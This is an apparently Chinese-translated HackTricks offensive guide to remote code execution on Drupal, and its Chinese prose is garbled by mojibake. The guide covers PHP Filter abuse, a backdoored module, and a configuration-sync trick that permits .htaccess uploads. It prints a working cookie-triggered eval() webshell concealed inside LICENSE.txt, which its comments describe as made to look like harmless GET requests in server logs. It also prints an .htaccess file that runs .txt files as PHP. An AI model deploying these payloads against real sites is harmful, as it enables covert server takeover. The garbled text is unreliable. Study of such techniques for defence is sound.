# Drupal RCE

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä½¿ç”¨ PHP è¿‡æ»¤å™¨æ¨¡å—

{% hint style="warning" %}
åœ¨æ—§ç‰ˆæœ¬çš„ Drupal **(8 ä¹‹å‰)**ï¼Œå¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•å¹¶ **å¯ç”¨ `PHP filter` æ¨¡å—**ï¼Œè¯¥æ¨¡å—â€œå…è®¸åµŒå…¥çš„ PHP ä»£ç /ç‰‡æ®µè¢«è¯„ä¼°ã€‚â€ä½†ä»ç‰ˆæœ¬ 8 å¼€å§‹ï¼Œè¯¥æ¨¡å—é»˜è®¤æœªå®‰è£…ã€‚
{% endhint %}

1. è½¬åˆ° **/modules/php**ï¼Œå¦‚æœè¿”å› 403 é”™è¯¯ï¼Œåˆ™ **PHP è¿‡æ»¤å™¨æ’ä»¶å·²å®‰è£…ï¼Œæ‚¨å¯ä»¥ç»§ç»­**
1. å¦‚æœæ²¡æœ‰ï¼Œè½¬åˆ° `Modules` å¹¶å‹¾é€‰ `PHP Filter` çš„æ¡†ï¼Œç„¶åç‚¹å‡» `Save configuration`
2. ç„¶åï¼Œä¸ºäº†åˆ©ç”¨å®ƒï¼Œç‚¹å‡» `Add content`ï¼Œé€‰æ‹© `Basic Page` æˆ– `Article` å¹¶ç¼–å†™ **PHP åé—¨**ï¼Œç„¶ååœ¨æ–‡æœ¬æ ¼å¼ä¸­é€‰æ‹© `PHP` ä»£ç ï¼Œæœ€åé€‰æ‹© `Preview`
3. è¦è§¦å‘å®ƒï¼Œåªéœ€è®¿é—®æ–°åˆ›å»ºçš„èŠ‚ç‚¹ï¼š
```bash
curl http://drupal.local/node/3
```
## å®‰è£… PHP Filter æ¨¡å—

{% hint style="warning" %}
åœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œä»…é€šè¿‡è®¿é—®ç½‘é¡µåœ¨é»˜è®¤å®‰è£…åå®‰è£…æ’ä»¶å·²ä¸å†å¯èƒ½ã€‚
{% endhint %}

ä» **8 ç‰ˆæœ¬å¼€å§‹ï¼Œ** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **æ¨¡å—é»˜è®¤ä¸å®‰è£…**ã€‚è¦åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬å¿…é¡» **è‡ªå·±å®‰è£…è¯¥æ¨¡å—**ã€‚

1. ä» Drupal ç½‘ç«™ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„æ¨¡å—ã€‚
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. ä¸‹è½½å®Œæˆåï¼Œè½¬åˆ° **`Administration`** > **`Reports`** > **`Available updates`**ã€‚
3. ç‚¹å‡» **`Browse`**ï¼Œä»æˆ‘ä»¬ä¸‹è½½çš„ç›®å½•ä¸­é€‰æ‹©æ–‡ä»¶ï¼Œç„¶åç‚¹å‡» **`Install`**ã€‚
4. æ¨¡å—å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡» **`Content`** å¹¶ **åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬é¡µé¢**ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨ Drupal 7 ç¤ºä¾‹ä¸­æ‰€åšçš„ã€‚å†æ¬¡ç¡®ä¿ **ä» `Text format` ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© `PHP code`**ã€‚

## åé—¨æ¨¡å—

{% hint style="warning" %}
åœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œä»…é€šè¿‡è®¿é—®ç½‘é¡µåœ¨é»˜è®¤å®‰è£…åå®‰è£…æ’ä»¶å·²ä¸å†å¯èƒ½ã€‚
{% endhint %}

å¯ä»¥ **ä¸‹è½½** ä¸€ä¸ª **æ¨¡å—**ï¼Œæ·»åŠ ä¸€ä¸ª **åé—¨** å¹¶ **å®‰è£…** å®ƒã€‚ä¾‹å¦‚ï¼Œä¸‹è½½ [**Trurnstile**](https://www.drupal.org/project/turnstile) æ¨¡å—çš„å‹ç¼©æ ¼å¼ï¼Œåœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ PHP åé—¨æ–‡ä»¶ï¼Œå…è®¸é€šè¿‡ `.htaccess` æ–‡ä»¶è®¿é—® PHP æ–‡ä»¶ï¼š
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
ç„¶åè®¿é—® **`http://drupal.local/admin/modules/install`** æ¥å®‰è£…åé—¨æ¨¡å—ï¼Œå¹¶è®¿é—® **`/modules/turnstile/back.php`** æ¥æ‰§è¡Œå®ƒã€‚

## ä½¿ç”¨é…ç½®åŒæ­¥å¯¹Drupalè¿›è¡Œåé—¨æ¤å…¥ <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**å¸–å­ç”±** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90) åˆ†äº«

### ç¬¬1éƒ¨åˆ†ï¼ˆæ¿€æ´» _Media_ å’Œ _Media Library_ï¼‰

åœ¨ _Extend_ èœå• (/admin/modules) ä¸­ï¼Œæ‚¨å¯ä»¥æ¿€æ´»çœ‹ä¼¼å·²ç»å®‰è£…çš„æ’ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ’ä»¶ _Media_ å’Œ _Media Library_ å¹¶æœªæ¿€æ´»ï¼Œå› æ­¤è®©æˆ‘ä»¬æ¿€æ´»å®ƒä»¬ã€‚

æ¿€æ´»å‰ï¼š

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

æ¿€æ´»åï¼š

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ç¬¬2éƒ¨åˆ†ï¼ˆåˆ©ç”¨åŠŸèƒ½ _Configuration synchronization_ï¼‰ <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

æˆ‘ä»¬å°†åˆ©ç”¨ _Configuration synchronization_ åŠŸèƒ½æ¥è½¬å‚¨ï¼ˆå¯¼å‡ºï¼‰å’Œä¸Šä¼ ï¼ˆå¯¼å…¥ï¼‰Drupalé…ç½®æ¡ç›®ï¼š

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**è¡¥ä¸ system.file.yml**

è®©æˆ‘ä»¬é¦–å…ˆä¿®è¡¥ç¬¬ä¸€ä¸ªæ¡ç›® `allow_insecure_uploads`ï¼š 

æ–‡ä»¶ï¼š system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

åˆ°ï¼š

æ–‡ä»¶ï¼šsystem.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ä¿®è¡¥ field.field.media.document.field\_media\_document.yml**

ç„¶åï¼Œä¿®è¡¥ç¬¬äºŒä¸ªæ¡ç›® `file_extensions` ä»ï¼š 

æ–‡ä»¶ï¼š field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

åˆ°ï¼š

æ–‡ä»¶ï¼šfield.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> æˆ‘åœ¨è¿™ç¯‡åšå®¢ä¸­æ²¡æœ‰ä½¿ç”¨å®ƒï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯ä»¥ä»¥ä»»æ„æ–¹å¼å®šä¹‰æ¡ç›® `file_directory`ï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ°è·¯å¾„éå†æ”»å‡»ï¼ˆå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨Drupalæ–‡ä»¶ç³»ç»Ÿæ ‘ä¸­å‘ä¸Šè¿”å›ï¼‰ã€‚

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ç¬¬3éƒ¨åˆ†ï¼ˆåˆ©ç”¨åŠŸèƒ½ _æ·»åŠ æ–‡æ¡£_ï¼‰ <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

æœ€åä¸€æ­¥æ˜¯æœ€ç®€å•çš„ï¼Œåˆ†ä¸ºä¸¤ä¸ªå­æ­¥éª¤ã€‚ç¬¬ä¸€æ­¥æ˜¯ä¸Šä¼ ä¸€ä¸ª.htaccessæ ¼å¼çš„æ–‡ä»¶ï¼Œä»¥åˆ©ç”¨ApacheæŒ‡ä»¤å¹¶å…è®¸PHPå¼•æ“è§£é‡Š.txtæ–‡ä»¶ã€‚ç¬¬äºŒæ­¥æ˜¯ä¸Šä¼ ä¸€ä¸ªåŒ…å«æˆ‘ä»¬æœ‰æ•ˆè½½è·çš„.txtæ–‡ä»¶ã€‚

æ–‡ä»¶ï¼š.htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
ä¸ºä»€ä¹ˆè¿™ä¸ªæŠ€å·§å¾ˆé…·ï¼Ÿ

å› ä¸ºä¸€æ—¦ Webshellï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º LICENSE.txtï¼‰è¢«æ”¾ç½®åˆ° Web æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ `$_COOKIE` ä¼ è¾“æˆ‘ä»¬çš„å‘½ä»¤ï¼Œå¹¶ä¸”åœ¨ Web æœåŠ¡å™¨æ—¥å¿—ä¸­ï¼Œè¿™å°†æ˜¾ç¤ºä¸ºå¯¹æ–‡æœ¬æ–‡ä»¶çš„åˆæ³• GET è¯·æ±‚ã€‚

ä¸ºä»€ä¹ˆå°†æˆ‘ä»¬çš„ Webshell å‘½åä¸º LICENSE.txtï¼Ÿ

ç®€å•æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä»¥ä»¥ä¸‹æ–‡ä»¶ä¸ºä¾‹ [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)ï¼ˆè¯¥æ–‡ä»¶å·²ç»å­˜åœ¨äº Drupal æ ¸å¿ƒä¸­ï¼‰ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª 339 è¡Œå’Œ 17.6 KB å¤§å°çš„æ–‡ä»¶ï¼Œè¿™éå¸¸é€‚åˆåœ¨ä¸­é—´æ·»åŠ ä¸€å°æ®µ PHP ä»£ç ï¼ˆå› ä¸ºæ–‡ä»¶è¶³å¤Ÿå¤§ï¼‰ã€‚

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

æ–‡ä»¶ï¼šå·²ä¿®è¡¥çš„ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **ç¬¬3.1éƒ¨åˆ†ï¼ˆä¸Šä¼ æ–‡ä»¶ .htaccessï¼‰**

é¦–å…ˆï¼Œæˆ‘ä»¬åˆ©ç”¨ _Add Document_ (/media/add/document) åŠŸèƒ½ä¸Šä¼ åŒ…å« Apache æŒ‡ä»¤çš„æ–‡ä»¶ (.htaccess)ã€‚

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ç¬¬3.2éƒ¨åˆ†ï¼ˆä¸Šä¼ æ–‡ä»¶ LICENSE.txtï¼‰**

ç„¶åï¼Œæˆ‘ä»¬å†æ¬¡åˆ©ç”¨ _Add Document_ (/media/add/document) åŠŸèƒ½ä¸Šä¼ éšè—åœ¨è®¸å¯è¯æ–‡ä»¶ä¸­çš„ Webshellã€‚

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### ç¬¬4éƒ¨åˆ†ï¼ˆä¸ Webshell äº¤äº’ï¼‰ <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

æœ€åä¸€éƒ¨åˆ†æ˜¯ä¸ Webshell è¿›è¡Œäº¤äº’ã€‚

å¦‚ä»¥ä¸‹æˆªå›¾æ‰€ç¤ºï¼Œå¦‚æœæˆ‘ä»¬çš„ Webshell æœŸæœ›çš„ cookie æœªå®šä¹‰ï¼Œåˆ™åœ¨é€šè¿‡ Web æµè§ˆå™¨æŸ¥è¯¢æ–‡ä»¶æ—¶ä¼šå¾—åˆ°åç»­ç»“æœã€‚

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

å½“æ”»å‡»è€…è®¾ç½® cookie æ—¶ï¼Œä»–å¯ä»¥ä¸ Webshell äº¤äº’å¹¶æ‰§è¡Œä»»ä½•ä»–æƒ³è¦çš„å‘½ä»¤ã€‚

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

æ­£å¦‚æ‚¨åœ¨æ—¥å¿—ä¸­çœ‹åˆ°çš„ï¼Œä¼¼ä¹åªè¯·æ±‚äº†ä¸€ä¸ª txt æ–‡ä»¶ã€‚

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

æ„Ÿè°¢æ‚¨èŠ±æ—¶é—´é˜…è¯»æœ¬æ–‡ï¼Œå¸Œæœ›å®ƒèƒ½å¸®åŠ©æ‚¨è·å–ä¸€äº› shellsã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hackingï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hackingï¼š <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)


<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
